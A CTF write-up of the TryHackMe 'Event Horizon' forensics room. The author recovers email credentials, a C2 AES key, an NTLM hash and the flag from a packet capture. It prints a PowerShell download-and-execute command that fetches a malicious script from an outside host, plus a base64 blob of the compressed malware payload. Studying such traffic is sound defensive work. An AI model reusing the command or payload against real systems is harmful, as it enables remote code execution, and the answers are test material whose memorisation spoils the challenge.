<h1 align="center">Event Horizon</h1>
<p align="center">2025, August 8<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>459</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Unearth the secrets beyond the Event Horizon.</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/317f46fa-cd76-40e1-8eac-dd8a7ba2de1d"><br>
Access this hard-level CTF clicking <a href="https://tryhackme.com/room/eventhorizonroom">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/62b55b16-1bf1-45ec-b74c-660cb302af9c"></p>

<br>


<br>
<h2>Task 1 . The Event Horizon</h2>
<p>Join Tom and Dom on a quest to find out what happens when you look beyond the Event Horizon. A quest beyond borders, they need you to utilize all your abilities to find the secrets that were taken when they crossed over to the other side.<br>

<strong>Note</strong>: For free users using the AttackBox, the challenge is best done using your own environment. Some browsers may detect the file as malicious. The zip file is safe to download with md5 of a1eda8f91365c322ebc8ce9b178248bc. In general, as a security practice, download the zip and analyze the forensic files on a dedicated virtual machine, and not on your host OS.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. The attacker was able to find the correct pair of credentials for the email service. What were they? Format: email:password<br>
<code>tom.dom@eventhorizon.thm:password</code></p>

<p>

- VXNlcm5hbWU6 = <code>Username:</code><br>
- dG9tLmRvbUBldmVudGhvcml6b24udGht = <code>tom.dom@eventhorizon.thm</code><br>
- UGFzc3dvcmQ6 = <code>Password:</code><br>
- cGFzc3dvcmQ= = <code>password</code><br><br>
- <code>tom.dom@eventhorizon.thm</code> : <code>password</code></p>

<br>

<img width="1724" height="68" alt="image" src="https://github.com/user-attachments/assets/7081a1e8-f295-41d1-a916-1a9ad443e816" />

<br>
<br>
<br>

<p>1.2. What was the body of the email that was sent by the attacker?<br>
<code>Tom! I have done it! I have found the mass of the black hole we found! Run this script as the AdministratOr! Your BEst friend DOm</code></p>

<br>

<img width="1359" height="475" alt="image" src="https://github.com/user-attachments/assets/2eeffd47-5e0d-4aa1-a5ac-a6dd33940aed" />

<br>
<br>
<br>

<p>1.3. What command initiated the malicious script download?<br>
<code>IEX(New-Object Net.WebClient).downloadString('http://10.0.2.45/radius.ps1')</code></p>

<br>

<img width="1914" height="986" alt="image" src="https://github.com/user-attachments/assets/b49d08c6-9233-422c-b64c-442e9340e1fb" />

<br>

<img width="1771" height="589" alt="image" src="https://github.com/user-attachments/assets/6ab1d8e6-4a0c-41b2-957c-b09196cd1236" />

<br>

<img width="1906" height="875" alt="image" src="https://github.com/user-attachments/assets/47b6bb1c-2039-48e7-95a5-73ed02f1a572" />

<br>
<br>
<br>

<p>1.4. What is the initial AES key that is used for decrypting the C2 traffic?<br>
<code>l86TfRDvvJMtXWxr1PSoh1QlXHnZnLwn+wz+aYy3/s8=</code></p>

<p>

- File > Export Objects > HTTP<br>
- Select<br>
- Save <code>radius.ps1</code><br>
- get <code>radius.ps1</code> hash</code><br>
- research the hash obtained in <code>VirusTotal</code><br>
- identify <code>CONNECT http://10.0.2.45:8081/en-us/test.html</code><br>
- identify <code>https://posts.specterops.io/covenant-v0-5-eee0507b85ba</code><br>
- run a Python script to decompress <code>radius.ps1</code><br>
- open it in a reverse engineering and analyzing .NET assembliy tool</p>

<br>

<br>

```bash
$ powershell.exe -Command "Get-FileHash 'radius.ps1' -Algorithm SHA256"

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          6F89901021C14ABD9A89F6014AD282759CF36E7E9940F5A96D55D47C16CD9A89       ...
```

<br>

<img width="1588" height="135" alt="image" src="https://github.com/user-attachments/assets/1f2eddd7-8b73-4353-9729-44a9768b476c" />

<br>

<img width="1333" height="587" alt="image" src="https://github.com/user-attachments/assets/cf510def-f005-4bbd-964f-1ddd9f0f68d1" />

<br>

<br>

```bash
import base64
import zlib

base64_string = "7VprcBvXdT53F1gsIQnigk9JpAQ9KEEURfOpl2VZfEmkTNKSSOoVuTIILElYIBbaBWTSqh26cd3YqWv7h9M4bZrY8UziTNzGkzZ+NGmqxnXTJs44HU/HzkPjJE5n4mYaOZnaSaeR+p27CxAQSbvun0xmAgjnntc995xzz7m4C2ro1EOkEpEPn6tXiZ4l97Wf3vs1h09o3fMh+uuyl9Y/KwZfWj86lXQiGduatGPTkXgsnbaykXEzYufSkWQ60nvzSGTaSpjNK1YEN3k2DvcRDQqFfjH60kTe7uu0gZaJFqJGEIrLa+wHiOBzq+ddxJX5vDn5UTrlzVFo/x8Slct/82NhkK9XDxLd/G5BYr3l/4dcLHjBP72I1EH3F9HNWXMmi7El6uoWx1pk4tZm20xZcc+HWz2dplK9/UTd/x8X+bXcc6pfmvbTPduJRlcTCXcp7f3a26FEMSeoRLEhWuNaB3a0zYhtTYtGz5ZJu4azAsygDTRT8wCv1VC9rukT0QDmRcHctkyz4UXmTtSlz75uKa27sI6vYXvN5rv8QK5oBow6WCHYMMeSKLzfJhWX2/ElbQRKbYTnbQRKbKywL4ulbOilNirmbeglNip89h8plIkug8zepQLDpgYr/PZedSFX02zLBwKpCt6JXPqKaa57J8RqAfsCuBV6dCVTm8KbrlRjurDK2drDEMlMWmyyel3QMlirzH6ELYUZD9o/4/nLohVMLTeW11iVwIzltVaVHI2gVS0Rq4aHoFPLiisiXNzOKuDOamaEomtYHKq26jBa9cxbiUlrmbuy2lj5J0lrHTPLjRVGuRVh1DCW1T3glwk1dKMsuh7Mxxtq7Cf8lHm8oVZ6/njDKljZwLneKMWrjXIPW2MYLhbdxNbCkcsov2gDcO2KFuJN2MzTtjCQzoWlW5xoraKisqLS0RmrNCprrCjLK6Nb2fdGiVvbWLeJGds5l+xMRVXAaua1Gna9gbXCDdHrmNpcXbFl1/1g6MYWq4WVP4sIoq3AmnYYlcZmpw1oWV74JQjt5/3erth/5y/eJAuFo23bg/XbQRUMliqVLc62OtjzLTUnKrYYW8qsTlA3Jq9evcouGD4jYPgkz9rBYJH5cgOsnQCbjc0VVZfUzZc4xl1g7CmHnUuhcMOVajTlGms3eN+rrojuuluGHb027HasWeWFHV0ybKOsKOaOQszReec8jbJFeG60UUQbNaJetLYbbdXS0XqTZaiG36iI7mHx9UxpUdSiVi11K6rdkqnmZtSsvZJlVBvLpE7DKleppmG1i9SukaNR6zbVKtT4KlnjskCjN3BK/N//MtoYDVUjlax9blfdyMOqamNVvkFWGyFjdY21n/E1blvWGXVeW9Z5bVlnrHHbss5tyzqri1vR7c3VDyCPoqI+2s2ieqvH1ZCtWF9t1OdXWgs31y5sxTLuwW9e04N1pT24dvEeXOdmbV1xo1VXbPWqZOu7VcnW91slWxepkoU8t0q2okq2Glt/K6rkozjcsb/FVVK3oEq8LY5443psW6R6dbSXRcZ6DzPqpWEjUmJ/h7SfLxtZFOurjfX5otgArzYsURQvv3tRbFi8KDa6SdpYWhSNXlE0vltRNL7fomhcpCgW8tyiaERRNBqNvxVFwbl6z6KI9rHwAED1x62Dcqhcnd/AKmygdoFvVNhB3k5s3+MWbn3BzZc2V2yLDrCxbdYhb48Yv4nxQbY5BHCJGrsG3TveyyihVzF+Fub42YGX4GvpPwC8g/E5MEPX3AsfLnM/+E5mmahoUSmsyDumoUaHOcmv8DZ/p7DNl0rJN5h8M0+WC9X+TyZu5gSFXcJ+u1gc1orETNirtSLxjmIxE/a+YvGpYjET9nix+K5iMRP2vcXix4vFTNifKxI7h4lvyEcAg85RwGWaNcIxvshKozxtTeBaljXG4BiAJ3llofIrSyr/cKHyD5dUvrxQ+fKSylcWKl9ZUnl5YIFygTWvHGhcq1zAjdnXuEFR75TIISV6nJPmnOCiDPCzxR75pKGpPuskePz4VNGiyPpC+RmKGj0Fdg5flyKobdc9ulFzZ1kfYKewjmwzHsPeqLnG2Ba+g/m50qgJKhf4yt20SZEdJA9AtzXDPus0+yX58gALasoFvq+fadJCvuorWLyx2cF1XJvjx4PGA/J0UN1G3uuu1T1yqFvIJy73Oe98W3NLc2fLzradJLsrBfgC/Np4F54XEXsL+mjjSNZOpicd1rgV5uvA3zg2Qr9f4z7fbjw4NoAvAfpj0F+H8xu7U9a414sgxfGqx8vKgiD+W7RTtfu8x/HyAx8/t+LiIe0gOipz8yB1vOdC2ffCG32Uf3T9L8WNQqOPK7dpGj0v4b1Kv7aS7ue800uB0z6NTigMx+nX4HzMd9oXpAntU7pGnyaGMT/DHnHat47e5lOTov7TvhA9po4FQvR24LsBjc7Ccoi+5f8uOC+oLL1FZ/wmnaVdyt+w1Mfw0cCbepA+TLziaT/Dh1Re8WvisF+jUekD6cy/6GPYI/G4j314RDC8T8KPBBiG1RnA81L6BQnvBwzRh6UnVwXDb6pvghMuY/zzktPkY/iOxrBSal72rRcafUvwWq/LbAiZgbulh/dLH76iXwJcKaVtfsajCsPvyFmX/C/iJL1H55z4/AxvkDCijAV4D/5W7oSQ73L6nP9z/iqJK6AuQ6MLuEZ/IMrpk9jAKvCXkQoKXz6SWkHq+nL6laT8tBLa/eKIotEadQzwi+oJwEZ9TNlBz9AHlGrIzwB2SpgEPMyG6N7aGlSAoN+T1Efpn32Tyjz1qjKtKDTlatKfYz8Umml0Zdcr5yD7qPyt4179S/4Lio/+QlJ36//i3wfqM03zK/jpeZeiR7Vtip++KakX6JS+UwnQlSbX5jO+TUInbbtL7dW/gdoObZ+3EqRaSX2IHqQ5JUgJST1cW69NK6ESzRBlPM0gPSHmqX2gVhYoG1S53IWfawz/Q3bKiwHGf8ZtSF9XmfOElH5B8n8q8V4J7/CzdKfOffYqnyr0pNR5gebhy4ihRhNkEPu1CjBIrRK/T8KtEr5Gbwam6Ac0pVs4Y2q0+4G/EniI3qKfiqcgTYqnsdfXK8+gLlg/RvvFlzH3HvUipH+q/iMJ0ah+gwboiPJtKhNz4t8ANfX7gB/T3wB8HdV0BHPfoPWCLZwE/iZtFX9JP6dWMaP+EviPtF9Ds0NTxW5R6ysTXeIzali8Rs8GVoky8a+0TghxvboJnK8GGsWA2OdrFScFezsgLqu7xN3UFrhRPEZ1Zb3A9bJDgFf0IyIpKgPHRUz4AreISvqF/zZRR8v1WeAjvrtg7WX9HvEoRw39DwYeFPeJfw88Ammt/meiixz9k+AfUp/ALEt/Ujws2hXO2FcDT4F/Un0anj+gfhF2vgc7ZRg53k2I4iRt0J8D5yF9nXgM3XER8EfIwJPiRf2fxHOiVrwC+Hnte+Ki+ID2I/Ft8WXxpnhN/MT/ljhHnxIX6RydE5zhZwPviB+IH4r7xU/EL4WuvEaDgRXKTzh2cB5Tw0ql3JdZygZqlbfEiG+tIpQfKxepkupFg3K3lD7sQe6Bu2XtP0ncK0/TBPZxPW2ji0oz+vwhwAp6FHANPavsp43gf1pK/17Cr0n4uoTldEW0Kb2KKs/7b/k/gq7UiKkA4IcoIRzhm7vmukc9/tKfM/uVy3JU+bZY4FUqRNfqnfa5egqqnX+R5NUUVPcHcQ591lXau2/3mTPtZ1pob9+MGc9lzZFsbNK094173H3xM2d6k04mFZvtScUcx2XKOa2Lzmmlgb50btq0Y+Mp89ZWGkw6WQzenLZF57TRgVw6fuuiQuof6uoZ6e9q69xBk2b2zNjogV1sjfYOWYlcytxH/TQy62TN6eaBm2lM6gwcI8cdDpppeJI1gSZi2RhNO3HLTiXHObD8tB4rlTLj2aSVdpqlfjJOg1YsQV2JxGI6IxkznoylkneYCRo2bz+YSyZob49lnU2aPVY6G0vCxL6zZ850x+Jnca84kDRTCTpqIoVxU7qH6OJnR20m2U3EYdLhWCIBZYn3JDNTpi1RVh8yHQfpoB7bTJjpLJbuicWnTBpIn7fOmjSfbRrgnbIcicMVx8J43E5mzUH4JG3BX4n3OfFYxqQRZBvy2cO2lbXiVmp0lpn5kG1YiWWyOYxDZnbKSnTHHJPcNdhjG/BEZ8vuHtPOJieSceSZneRhZLRrdApooiuLy9V4jiXWdCaZMu38lhSJes3x3OQku32teoxTftRMxWYk5szLj+aQimmT1SAaT6YQxrzUqyPqns26gR+LpXImnZcw3W6f7+zIpJtTLeeazRl3F7wNQDrjlkTGHJMDO5xMp5k8YFvTHP+ODve6SKNWCdlr3Z5OoWo8cixTRBw0s2yqP+ZMFSafmE4V8Hk1DxvJjTsuNhTLxqdkMhAOGwB+3kzH0gWLNGYnCbuIEpu2smbRZiDmZELmrSeWSo2j6GSkI6Z93rTfXQ/VmXYmLHv6QDIdS+HCC96wmb3dss/Ol6FnrbSE3AZEAXl1hGF62kQw8a7UpAXNqWnqchbyOJR56mgsnbCmySv9gjc00GPPZrLWPKPbQpHH0shTMu0W4xRjcQm9Sj5qTnjNS8OxaVOWwnxD00HbymWK6OPmeD8qFyma5/XNxM2MxNxOGEhPWO7EkmrKr4geO0fwxKajI12uy5z1ZNxEms4nYRu5S/PQnZuYwJCXWsl0diiW5tOPSs5CLIaC93BO8TUHjtyLa3mj5kxW9r87pc+2LZurzDsysqDcRA/npscLnQluc9yFcnBbuteMyzjyNPrEo1Gp+bh7k7HJtOVkk3GH13Fz5VCX6RT2wm3b5vxp4AXueGeAdwRCHS0jo3Eo7o0wyOdTwVS+8prdBE/asczUbPM1B5KcxqeAQ+MSxmw86Q3MF7HjZq6I5lT1mhOxXCq7oORdbRwNnkKxxMt7wT/OPmpvMpeK2X0zGRu1zEeYtC9Lx0XdWsN0J4MjFfWZZWrESR22Usn4rNw0h0x3wCHFdngtREcH0AIYJtzh5vHbUK5IXUoOrhcIgZNJIxmckOTmFBXek0rCb5x255O2lZ5mXFZVzrYLuIW9Im/fyTsk5PlCcQb4/uEBrsixP5vNwPBR81zOdLKc9iJq1OJ7AA3h7Brmv9YWpQjn1qQ5Q122HZuV695kzsos8/huW41jxDGnx1OzJM+nHiszS1bmTN+5XIy/DBgfSJt5aj4dBWtyNTTkjLueiw3AaxcrqoMCj7ZNURbvDO2h6/BupRZqlp82fDrwzLaHdoHeBQmude3H6AQNU4rieI5rpW46Bb1jlCNcLugGvJtwz2+j3XQeTwlt0Evhkewjo3QcrB1gHacZcnD9H5EGB+k2TJukm+gADGTw0I+DElMT1E5D4I9i+hGMw1isAzNvwrxuvOO4InXDziksnYDOSTorQ0hQj7Q7RHdAJyfHk9J+H+QD0O6T0kHo8Xz2J4v5A+C7dtpAn/fW6YW8nw6BHofeGMZh8Pqk3R74M4vxNsztKMQxhvkHEMNJJOkQ/BnE+mP4DEO3Q46ThSQdA3UE0hZgo3JM0WFgZzH2ATsBT/ohG5P0BCSOXGEp/VEZ2zDGAazEkQ9g84Yx9iGbzOcNorlHBr0dG8QSxyAelPuUQzIPguZgpmkK5jno26Wzi83gbToptykn03QU7o4XamDhjHZocNW0I+iFM2jur5IYYohgN5mydNrhwg6MCSjtxrsFnF2yhtrx6aCdoOKQ7YIsgUjbMG8zsBjMxmDrAmbcCQ5OGnwcVJBFafB3QpdtbpdWx7HidsztRIZNWDXBiwEfB9Yp1+O63Y4122RK2LedoIQaRGG37iXunmlEtg/P+hHvzVxWTJRw56VZOMNlZxLf9U3ZJRYkxwFt4Ak8je1FLxbrFVu/blH7e+GeBd7sEqtm3mO1zKLz+EyILDkv4qW51LtiP1xv8zmiZRPwOyU3hao6kdoJudU7ZLo5xaRuJ3EyJVM/CulRtNx5vA+h0rKoJj5AbGzaYbSoBcutqKcU+P3Y3FP4DKJm03g2vR1Vtw1rnYQf7fDBgUWusy9egMsbUOpj6I9eYHvwcYPYgMLdgEVnkQpTSi7A/J2SOwQO11Vev62gz6dKntte4PbBiTgcZVtZzE1IC448cyY96zyjozCjHxpdOFfykk4puRNvUpGWFT0I10K3Jzl16vX4NIF7oRAJ6+GIVtuI/Kcxn1R8/Bwt+V0r+ATcSGlNlG6kLfDEhs0cfGwB1UyNtJVEwI16oU5riU7bojptJTrti+q0l+h0LKrTUaLTuahO57zOiuJIaEWxz8VUWwnVXkJ1lFCd/FPCgyP/88Gvb6w59NT2/XWjH/rOg+SLCKGrERJ+IIZxPNAUrqwK14vQNSAUCq8Pher9oXBDeGt4e72f32AuhyTkUuEGyfNERmuV0Yl5Ol7h3VpE1Ifq1ZXlQrC5tVQVzgGqQRHSqsKmEgr5I4qoq60pVxQpEq4Cy9bSWuELQoX/zgY1LOgjoYT4bxWtcF3ydN1PAsv6+D+qaBzL3H3u8ABHVu8PwL4ennvYD4W5RxB2SIEAM/wRMD6hR1R2W9fZUyB+kutEiFGBoDRm1NdpxDaf5CE89xRnT5EWn+bFMEhrT0vWcy7rK36ZQD1CnJAK8su8wDLQCGg4rii8lBCuLxc5FYg2QjqYOgNJKdKnOkwKyXDYTXfxby8nP1Z6TeePHiDg34fHcD489wN3+LEWUerq6uuk/lsaqbxvZQElfIP0DgmVLihwQYRvcB35FQIIz/2aWfATBkR4KOQLiPAYC46Eh1gQHlADQtGfueP0sVUdr9+nauEBRVMULQSsNpDfXKSrnvdPlJHi1RMyEB4IRnxKXfhk+BYj5ouC1oX33wjX8m/3o0r1cVwjh6104dludMq2bneELryf0XzC+yFt/je11fn/O7nIa3nxf0okXJ9x6zflc6n81ck0mxOplJRdbaDI/sWN/O712/va7/7NsWnXb9qR371+E6//BQ=="
compressed_data = base64.b64decode(base64_string)
decompressed_data = zlib.decompress(compressed_data, -zlib.MAX_WBITS) 
open("OUTCOME.bin", "wb").write(decompressed_data)
```

<br>

```bash
$ python3 a.py
```


<br>
<br>
<br>

<p>1.5. What is the Administrator NTLM hash that the attacker found?<br>
<code>13b1e64400203ecf38b1fdea2b11a09f</code></p>

<br>

<img width="1899" height="762" alt="image" src="https://github.com/user-attachments/assets/85592bcc-bd6a-441b-b01d-d28d491a548a" />

<br>

```bash
$ tshark -r traffic.pcapng -Y 'http.request.method == POST' -T fields -e http.file_data
```

<br>
<br>

<p>1.6. What is the flag?<br>
<code>FLAG{ABOVE_AND_B3YOND_THE_EVENT_HORIZON}</code></p>


<br>
<br>


<img width="1903" height="899" alt="image" src="https://github.com/user-attachments/assets/2446c058-3bb0-495c-9600-5a9092f91ed9" />

